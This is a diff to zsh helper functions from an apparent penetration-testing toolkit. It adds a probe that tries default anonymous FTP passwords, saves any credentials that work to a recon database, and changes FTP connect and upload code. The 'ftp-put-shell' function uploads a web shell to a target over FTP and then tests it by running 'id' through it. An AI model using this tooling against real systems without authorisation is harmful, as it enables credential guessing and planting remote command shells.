@@ -3,17 +3,91 @@
 # ========================
 
 _ftp-creds-save-anon() {
-  local ip="$1"
-  [[ -z "$ip" || -z "${RECON_APP:-}" ]] && return 0
+  local ip="$1" user="$2" pass="$3"
+  [[ -z "$ip" || -z "$user" || -z "${RECON_APP:-}" ]] && return 0
 
   local creds_status
-  creds_status="$(python3 "$RECON_APP" creds-add "$ip" "$FTP_ANON_USER" "$FTP_ANON_PASS" --comment "FTP anonymous" 2>&1)" || return 0
+  creds_status="$(python3 "$RECON_APP" creds-add "$ip" "$user" "$pass" --comment "FTP anonymous" 2>&1)" || return 0
 
   case "$creds_status" in
-    unchanged) echo "[=] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
-    updated)   echo "[~] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
-    *)         echo "[+] creds: ${FTP_ANON_USER}@${ip} (pass: ${FTP_ANON_PASS})" >&2 ;;
+    unchanged) echo "[=] creds: ${user}@${ip}" >&2 ;;
+    updated)   echo "[~] creds: ${user}@${ip}" >&2 ;;
+    *)
+      if [[ -n "$pass" ]]; then
+        echo "[+] creds: ${user}@${ip} (pass: ${pass})" >&2
+      else
+        echo "[+] creds: ${user}@${ip} (pass: empty)" >&2
+      fi
+      ;;
   esac
+}
+
+# Non-interactive login probe. Empty PASS makes inetutils ftp(1) read /dev/tty — use curl for that only.
+_ftp-login-ok() {
+  local ip="$1" user="$2" pass="$3"
+  [[ -n "$user" ]] || return 1
+
+  if [[ -z "$pass" ]]; then
+    command -v curl >/dev/null 2>&1 || return 1
+    curl -sS -f --connect-timeout 8 --user "${user}:" \
+      "ftp://${ip}/" --list-only -o /dev/null 2>/dev/null
+    return $?
+  fi
+
+  local script="" out=""
+  script="$(mktemp "${TMPDIR:-/tmp}/ftp-probe.XXXXXX")"
+  {
+    print -r "user ${user} ${pass}"
+    print -r "ls"
+    print -r "quit"
+  } >"$script"
+  out="$(command ftp -n "$ip" <"$script" 2>&1)" || true
+  rm -f "$script"
+  print -r -- "$out" | grep -qiE '530|login (failed|incorrect)' && return 1
+  print -r -- "$out" | grep -q '230' || return 1
+}
+
+_ftp-write-netrc() {
+  local ip="$1" user="$2" pass="$3" netrc="$4"
+  if [[ -n "$pass" ]]; then
+    printf 'machine %s login %s password %s\n' "$ip" "$user" "$pass" >"$netrc"
+  else
+    printf 'machine %s login %s password ""\n' "$ip" "$user" >"$netrc"
+  fi
+}
+
+# Try anonymous passwords; sets _FTP_PROBE_USER / _FTP_PROBE_PASS on success.
+_ftp-anon-probe() {
+  local ip="$1"
+  local user="${FTP_ANON_USER:-anonymous}"
+  local -a try_passes=() seen=() p pass
+
+  _FTP_PROBE_USER=""
+  _FTP_PROBE_PASS=""
+
+  if p="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
+    try_passes+=("$p")
+    seen+=("$p")
+  fi
+
+  for p in "" "$user" "${FTP_ANON_PASS:-anonymous@}"; do
+    local dup=false
+    for pass in "${seen[@]}"; do
+      [[ "$pass" == "$p" ]] && dup=true && break
+    done
+    $dup && continue
+    seen+=("$p")
+    try_passes+=("$p")
+  done
+
+  for pass in "${try_passes[@]}"; do
+    if _ftp-login-ok "$ip" "$user" "$pass"; then
+      _FTP_PROBE_USER="$user"
+      _FTP_PROBE_PASS="$pass"
+      return 0
+    fi
+  done
+  return 1
 }
 
 _ftp-log-host() {
@@ -65,27 +139,33 @@ _ftp-connect-creds() {
   shift 4
   local -a extra=("$@")
 
-  # .netrc auto-login keeps an interactive ftp session (heredoc + "prompt" exited immediately)
-  local netrc
-  netrc="$(mktemp "${TMPDIR:-/tmp}/ftp-netrc.XXXXXX")"
-  chmod 600 "$netrc"
-  {
-    print -r "default login $user password $pass"
-    print -r "machine $ip login $user password $pass"
-  } >"$netrc"
+  [[ -n "$user" ]] || {
+    echo "[-] ftp connect: missing username" >&2
+    return 1
+  }
 
-  local -a cmd=(command ftp)
+  echo "[+] connecting: ftp://${user}@${ip}" >&2
+
+  local netrc="" homedir=""
+  netrc="$(mktemp "${TMPDIR:-/tmp}/ftp-netrc.XXXXXX")"
+  homedir="$(mktemp -d "${TMPDIR:-/tmp}/ftp-home.XXXXXX")"
+  chmod 600 "$netrc"
+  _ftp-write-netrc "$ip" "$user" "$pass" "$netrc"
+
+  local -a cmd=(command ftp -i)
   (( ${#extra[@]} )) && cmd+=("${extra[@]}")
   cmd+=("$ip")
 
   if [[ -n "$logfile" ]]; then
     echo "[+] logging: $logfile"
-    NETRC="$netrc" script -q -f "$logfile" -c "${(q)cmd}"
+    NETRC="$netrc" HOME="$homedir" script -q -f "$logfile" -c "${(q)cmd}"
     echo "[+] session log saved: $logfile"
   else
-    NETRC="$netrc" "${cmd[@]}"
+    NETRC="$netrc" HOME="$homedir" "${cmd[@]}"
   fi
+
   rm -f "$netrc"
+  rm -rf "$homedir"
 }
 
 _ftp-connect-interactive() {
@@ -243,8 +323,9 @@ ftpa() {
         ;;
       -h|--help)
         echo "usage: ftpa [-l] [ip]"
-        echo "  connect as anonymous@host (default host: \$IP)"
-        echo "  saves creds-list entry: anonymous / \$FTP_ANON_PASS (default: anonymous@)"
+        echo "  probe anonymous login (empty / username / \$FTP_ANON_PASS) via ftp -n batch"
+        echo "  same tries as strike auth-ftp-anon; no password prompt on failure"
+        echo "  saves creds-list only after 230 login; connect via netrc + ftp -i"
         echo "  -l  record to cases/<name>/logs/ (requires case-set <name>, or CASE_LOOSE=1)"
         return 0
         ;;
@@ -261,13 +342,22 @@ ftpa() {
     return 1
   fi
 
-  _ftp-creds-save-anon "$target"
-
-  if $log; then
-    _ftp-run-logged anon "anonymous@${target}"
-  else
-    command ftp "anonymous@${target}"
+  local user pass logfile=""
+  if _ftp-anon-probe "$target"; then
+    user="$_FTP_PROBE_USER"
+    pass="$_FTP_PROBE_PASS"
+    _ftp-creds-save-anon "$target" "$user" "$pass"
+    if $log; then
+      logfile="$(_ftp-log-path "$target" "anon")" || return 1
+    fi
+    _ftp-connect-creds "$target" "$user" "$pass" "$logfile"
+    return $?
   fi
+
+  echo "[-] anonymous login failed for ${target}" >&2
+  echo "[i] tried: empty, ${FTP_ANON_USER:-anonymous}, ${FTP_ANON_PASS:-anonymous@}" >&2
+  echo "[i] strike (auth-ftp-anon) uses the same set; or: FTP_ANON_PASS=... ftpa" >&2
+  return 1
 }
 
 _ftpa() {
@@ -330,7 +420,7 @@ _ftp-shell-reset-case() {
 
 _ftp-anon-creds() {
   local ip="$1"
-  local user="${FTP_ANON_USER}" pass="${FTP_ANON_PASS}"
+  local user="${FTP_ANON_USER:-anonymous}" pass="${FTP_ANON_PASS:-anonymous@}"
 
   if pass="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
     echo "$user" "$pass"
@@ -358,14 +448,23 @@ _ftp-put-file() {
   fi
 
   echo "[!] curl FTP failed — trying ftp(1)..." >&2
-  ftp -n <<EOF
-open ${ip}
-user ${user} ${pass}
-binary
-$([[ -n "$remote_dir" && "$remote_dir" != "." ]] && print -r "cd ${remote_dir}")
-put ${local_file} ${remote_name}
-bye
-EOF
+  local netrc="" homedir="" script=""
+  netrc="$(mktemp "${TMPDIR:-/tmp}/ftp-netrc.XXXXXX")"
+  homedir="$(mktemp -d "${TMPDIR:-/tmp}/ftp-home.XXXXXX")"
+  script="$(mktemp "${TMPDIR:-/tmp}/ftp-cmd.XXXXXX")"
+  chmod 600 "$netrc"
+  _ftp-write-netrc "$ip" "$user" "$pass" "$netrc"
+  {
+    print -r "binary"
+    [[ -n "$remote_dir" && "$remote_dir" != "." ]] && print -r "cd ${remote_dir}"
+    print -r "put ${local_file} ${remote_name}"
+    print -r "bye"
+  } >"$script"
+  NETRC="$netrc" HOME="$homedir" command ftp -i <"$script" "$ip"
+  local rc=$?
+  rm -f "$netrc" "$script"
+  rm -rf "$homedir"
+  return $rc
 }
 
 _ftp-shell-remote-path() {
@@ -471,8 +570,14 @@ ftp-put-shell() {
   echo "[*] put:  ftp://${ip}/${remote_path}" >&2
   echo "[*] web:  ${url}" >&2
 
-  _ftp-creds-save-anon "$ip"
   _ftp-put-file "$ip" "$remote_path" "$local_file" || return 1
+
+  local user pass
+  if _ftp-anon-probe "$ip"; then
+    user="$_FTP_PROBE_USER"
+    pass="$_FTP_PROBE_PASS"
+    _ftp-creds-save-anon "$ip" "$user" "$pass"
+  fi
 
   echo "[+] done"
   echo "[i] test: shell-cmd $url id"
